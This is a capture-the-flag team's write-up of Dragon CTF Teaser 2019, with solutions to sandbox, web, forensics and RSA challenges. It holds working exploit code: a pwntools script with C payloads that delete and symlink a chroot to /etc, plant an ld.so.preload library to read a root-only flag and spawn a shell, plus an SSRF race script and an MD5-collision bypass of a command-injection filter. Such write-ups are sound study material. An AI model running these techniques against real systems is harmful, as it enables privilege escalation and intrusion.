# Dragon CTF Teaser 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190921-dragonctfteaser/) of this writeup.**


 - [Dragon CTF Teaser 2019](#dragon-ctf-teaser-2019)
   - [Sandbox](#sandbox)
     - [Trusted Loading 1](#trusted-loading-1)
     - [Trusted Loading 2](#trusted-loading-2)
   - [Web](#web)
     - [rms](#rms)
     - [rms-fixed](#rms-fixed)
     - [looking glass](#looking-glass)
   - [Misc](#misc)
     - [PlayCAP (unsolved)](#playcap-unsolved)
     - [babyPDF](#babypdf)
   - [Crypto](#crypto)
     - [rsachained](#rsachained)


## Sandbox
### Trusted Loading 1
We can execute any binary under the chroot("/home/chall/chroot"). We also can call trusted_loader to execute binary not under the chroot if that binary pass the signature check. The bug is at when trusted_loader check the file using stat with S_ISREG. If we provide a symlink, S_ISREG will also return True. We first let the symlink link to the "tester" to pass the signature check. Before trusted_loader execute the binary, we rename the binary which we want to execute to "tester". In the end, we can execute any binary not under the chroot to read "/flag1". 

### Trusted Loading 2
In this challenge, we have to read the "/flag2" which is only read by root. We found that we can upload file to the "/home/chall/chroot". This process is done by root privilege. "/home/chall" is owned by 1337, so we can delete "/home/chall/chroot" and make it as a symlink to any path. It means that we can create any file in any path. We create /etc/ld.so.preload and exit. When executing poweroff, it will preload our library. We hijack getopt_long to read the flag2.

```python
from pwn import *


def Upload(filename,name):
    data = open(filename).read()
    r.sendlineafter("3.","2")
    r.sendlineafter("?",name)
    r.sendlineafter("?",str(len(data)))
    r.sendafter("?",data)
def Do_elf(filename):
    data = open(filename).read()
    r.sendlineafter("3.","1")
    r.sendlineafter("?",str(len(data)))
    r.sendafter("?",data)
'''
init.c
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <unistd.h>
int main(){
        symlink("/home/chall/chroot/tester","PWN");
        symlink("/home/chall/chroot/tester.sig","PWN.sig");
        while(1) {
                sleep(1);
        }

}

exp.c
int main(){
        system("rm -rf ../chroot");
        system("ln -s /etc ../chroot");
        puts("Done");
        puts("3.");
        sleep(1);

}

sandbox.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(){
        write(666,"\x01PWN",4);
        sleep(1);
        rename("exp","tester");
}

libx.c
int getopt_long(){
        printf("My id : %d\n",getuid());
        int fd = open("/flag2",0);
        char buf[0x100];
        write(1,buf,read(fd,buf,0x100));
        unlink("/etc/libx.so");
        system("sh");
        return 0;
}

ld.so.preload
libx.so
'''


r = remote("trustedloading.hackable.software", 1337)
r.recvuntil(": ")
s = process(r.recvline()[:-1].split())
s.recvuntil(": ")
r.send(s.recvall())
s.close()

#r = process('./start.sh')

data = open("init").read()
r.sendlineafter("?",str(len(data)))
r.sendafter("?",data)
Upload("tester","tester")
Upload("tester.sig","tester.sig")
Upload("exp","exp")
context.arch = "amd64"
Do_elf("sandbox")
r.recvuntil("Done");
Upload("ld.so.preload","ld.so.preload")
Upload("libx.so","libx.so")
r.sendlineafter("3.","3")
r.interactive()
```

## Web

### rms
* The program didn't check IPv4 `0.0.0.0`.
* `http://0:8000/flag`
* `DrgnS{350aa97f27f497f7bc13}`

### rms-fixed
* `man gehostbyname`: `The functions gethostbyname() and gethostbyaddr() may  return  pointers to  static  data, which may be overwritten by later calls.
* Set up a domain with AAAA record.
* Race condition on ipv4 sockaddr.

```python=
#!/usr/bin/env python
from pwn import *

'''
HTTP/1.0 200 OK
Server: BaseHTTP/0.3 Python/2.7.15+
Date: Sun, 22 Sep 2019 13:10:31 GMT

DrgnS{e9759caf4f2d2b69773c}

'''

y = remote( 'rms-fixed.hackable.software' , 1337 )

def add( url ):
    y.sendlineafter( '[pfvaq]' , 'a' )
    y.sendlineafter( 'url?' , url )

add( 'http://domain:8000/flag' ) # domain with AAAA record

for i in range( 0x10 ):
    add( 'http://127.0.0.1' )
    
y.sendlineafter( '[pfvaq]' , 'v 0' )

y.interactive()
```

### looking glass
In this task, we can send a protobuf to server, the server will check the input won't cause commandline injection and execute it.
However, the validator also has a md5 cache.

The vulnerability is obvious: craft a good/evil pair of payload with same md5.

The first method I tried is chosen prefix collision: Create two payload and add some dummy bytes after to make md5 collision.
However, the input length is limited to 4 blocks. It's computation complexity is about 2^50.
It may be feasible using a single GPU machine, but I solved it in another way before my GPU found the collision.

There's a weaker version of collision attack on md5 called `Unicoll`, we can control the prefix and it also has a predictable difference (e.g. +1), 
so we can create blocks like:

```
aaaaaaaaaaaa...
aaaaaaaaabaa...
```

In protobuf, we have a `Length-delimited` type:

```
[id | type] [length] [data]
```

Combine these things together, we can create a pair of payload where the length has one byte difference.
And my final payload looks like:

```
Evil one:
(evil payload) ([dummyID] [ n ] [collision ...]) ([dummyID]    [dummyID] [0   [addressID] 7 "8.8.8.8"   [pad]])

Good one:
(evil payload) ([dummyID] [n+1] [collision ...    [dummyID]]) ([dummyID]  0) ([addressID] 7 "8.8.8.8") ([pad])
```


## Misc

### PlayCAP (unsolved)

This challenge was solved 30 minutes after the CTF ended, because I didn't notice the time lol.

[Official repo](https://github.com/gynvael/random-stuff/tree/master/teaser_dragon_ctf_2019/playcap)

The PCAP contains USB data of a controller talking to the HTML5 controller API. However. ot's hard to find the USB spec of Nintendo Switch controller. The only information I found is [this](https://github.com/dekuNukem/Nintendo_Switch_Reverse_Engineering/issues/7), though I don't think it's useful.

Then, in the HTML page, I found there were only 5 keys. Maybe we can directly observe bits in packets to determine the corresponding key. I write a simple Python script to analyze the bits distribution:

First, filter the USB packets with leftover data.

```shell
$ tshark -r PlayCAP.pcapng -T fields -e usb.capdata
```

Then compute the distrubition of each bits in USB leftover data.

```
Counter({'0': 4720, '1': 259}) // reset? confirm?
Counter({'0': 4979})
Counter({'0': 4918, '1': 61})  // confirm? reset?
Counter({'0': 4979})
Counter({'1': 4979})
Counter({'0': 4979})
Counter({'0': 4979})
Counter({'0': 4979})
Counter({'0': 4979})
Counter({'0': 4979})
Counter({'0': 4979})
Counter({'0': 4979})
Counter({'0': 4979})
Counter({'0': 4979})
Counter({'0': 4979})
Counter({'0': 4979})
Counter({'0': 4830, '1': 149}) // direction pads?
Counter({'0': 4606, '1': 373}) // direction pads?
Counter({'0': 4842, '1': 137}) // direction pads?
Counter({'0': 4794, '1': 185}) // direction pads?
...
Counter({'0': 2364, '1': 23XX})
```

Because the button usually works like this: if it's pressed, it will remain 1 for a few microseconds. Once it's released it will become 0. Based on this assumption, we can make a good guess. I've marked those bits in the code above.

The rest is just recovering the button.

```python
#!/usr/bin/env python3
from collections import Counter
from itertools import permutations

board = '''ABCDEFGHIJ
KLMNOPQRST
UVWXYZabcd
efghijklmn
opqrstuvwx
yz.,-=:;{}'''.split('\n')

# wirhshark: filter "usb.src == 1.8.1" and save as filtered.pcapng
# tshark -r filtered.pcapng -T fields -e usb.capdata  > data

lines = [bin(int(line[0:24],16))[2:].zfill(24*8) for line in open('data').read().splitlines() if line != '']
ops = [i[124]+i[126]+i[140:144] for i in lines]

dir_map = {dir_op_code:dxdy for dir_op_code, dxdy in zip(['1000', '0100', '0010', '0001'], [
   #(y, x)
    ( 0, -1), # left
    ( 0, +1), # right
    (-1,  0), # up
    (+1,  0), # down
])}
flag = ''
last_op = '111111'
last_cnt = 0
pos = (0, 0)
for op in ops[3:]:
    if op == last_op:
        last_cnt += 1
        continue
    if op == '000000':
        print(last_cnt)
        last_op = op
        last_cnt = 0
        continue
    assert last_op == '000000'
    assert op.count('1') == 1
    last_op = op
    y, x = pos
    confirm, reset, direction = op[0], op[1], op[2:]
    if confirm == '1':
        print('confirm', end=', ')
        flag += board[y][x]
    elif reset == '1':
        print('reset', end=', ')
        pos = (0, 0)
    else:
        print('dir', direction, end=', ')
        dy, dx = dir_map[direction]
        pos = ((y+dy) % len(board), (x+dx) % len(board[0]))
print(flag)
```

The flag: `DrgnS{LetsPlayAGamepad}`


### babyPDF
* Use zlib to extract pdj obj stream.
* Remove `/Filter /FlateDecode`.
* Change the color to black: `0 0 0 rg /a0 gs`.
![](https://i.imgur.com/SiTw5FM.png)

## Crypto
### rsachained
In this task, we got 4 different variants of RSA:

```
N1 = p1 * q1        (p 700 bits, q 1400 bits)
N2 = p2 * q2 * r    (p 700 bits, q 700 bits, r 700 bits)
N3 = p3 * q3 * r    (p 700 bits, q 700 bits, r 700 bits)
N4 = p4 * q4 * q4   (p 700 bits, q 700 bits)
```
And we have `N` and lower 1050 bits of `d`, which is defined as:

```
e = 1667
d = inverse(e, phi(N))
```
To solve the first one, we can use the method described in [this paper](https://link.springer.com/content/pdf/10.1007%2F3-540-49649-1_3.pdf).


```
e * d = 1 (mod phi(N))
e * d = k * phi(N) + 1
d < phi(N) => k < e

s = p + q
phi(N) = (p - 1) * (q - 1) = N − s + 1

e * d0 = 1 + k(N − s + 1)  (mod 2^1050)

p^2 - s * p + N = 0
```

We can try all `k` to find `s` and `p`.
Since `p` is only 700 bits, we don't need coppersmith to recover full `p`.

For second and third one, there's a common factor (`r`) between those two `N`. We can calculate gcd to recover `r` and divide it, so the problem becomes same as the previous one.

For the last one, we have to use a different polynomial:

```
s = (pq + q^2 - q)
phi(N) = (p - 1) * (q - 1) * q = N - s

e * d0 = 1 + k(N − s)  (mod 2^1050)

q^3 - q^2 - s * q + N = 0
```
Solve that polynomial to recover q.
